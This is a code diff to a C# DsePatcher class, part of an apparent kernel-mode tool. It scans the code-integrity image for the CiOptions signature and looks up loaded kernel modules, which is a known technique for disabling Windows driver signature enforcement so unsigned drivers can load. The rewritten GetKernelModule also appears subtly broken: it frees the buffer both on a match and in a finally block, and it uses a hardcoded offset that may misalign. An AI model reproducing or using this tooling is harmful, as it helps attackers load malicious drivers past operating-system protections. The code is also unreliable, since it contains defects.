@@ -4,6 +4,7 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using KernelMode.Driver;
+
 namespace KernelMode.Utils
 {
     public static class DsePatcher
@@ -96,7 +97,7 @@ namespace KernelMode.Utils
                 for (int j = 0; j < CiOptionsSignature.Length; j++)
                 {
                     // Wildcard for the relative offset part of the instruction.
-                    if (CiOptionsSignature[j] == 0x00) continue;
+                    if (CiOptionsSignature[j] == 0x00 && j >= 3 && j <= 6) continue;
                     if (ciImage[i + j] != CiOptionsSignature[j])
                     {
                         found = false;
@@ -122,33 +123,30 @@ namespace KernelMode.Utils
 
         private static DriverLoader.SYSTEM_MODULE_INFORMATION GetKernelModule(string moduleName)
         {
-            int length = 0;
-            NativeMethods.NtQuerySystemInformation(11, IntPtr.Zero, 0, out length);
-            if (length == 0) return new DriverLoader.SYSTEM_MODULE_INFORMATION();
-
-            IntPtr buffer = Marshal.AllocHGlobal(length);
-            if (NativeMethods.NtQuerySystemInformation(11, buffer, length, out _) != 0)
-            {
-                Marshal.FreeHGlobal(buffer);
+            if (!DriverLoader.TryQuerySystemModules(out var buffer, out var count, out var entrySize))
                 return new DriverLoader.SYSTEM_MODULE_INFORMATION();
-            }
 
-            long count = Marshal.ReadIntPtr(buffer).ToInt64();
-            IntPtr current = new IntPtr(buffer.ToInt64() + IntPtr.Size);
-            for (int i = 0; i < count; i++)
+            try
             {
-                var entry = Marshal.PtrToStructure<DriverLoader.SYSTEM_MODULE_INFORMATION>(current);
-                string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0');
-                if (name.ToLower().EndsWith(moduleName.ToLower()))
+                IntPtr current = new IntPtr(buffer.ToInt64() + 4); // Skip count
+                for (int i = 0; i < count; i++)
                 {
-                    Marshal.FreeHGlobal(buffer);
-                    return entry;
+                    var entry = Marshal.PtrToStructure<DriverLoader.SYSTEM_MODULE_INFORMATION>(current);
+                    string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0').ToLowerInvariant();
+                    if (name.EndsWith($"\\{moduleName}") || name.EndsWith($"/{moduleName}") || name.Contains(moduleName))
+                    {
+                        Marshal.FreeHGlobal(buffer);
+                        return entry;
+                    }
+                    current = new IntPtr(current.ToInt64() + entrySize);
                 }
-                if (entry.NextOffset == 0) break;
-                current = new IntPtr(current.ToInt64() + entry.NextOffset);
+            }
+            finally
+            {
+                if (buffer != IntPtr.Zero)
+                    Marshal.FreeHGlobal(buffer);
             }
 
-            Marshal.FreeHGlobal(buffer);
             return new DriverLoader.SYSTEM_MODULE_INFORMATION();
         }
     }
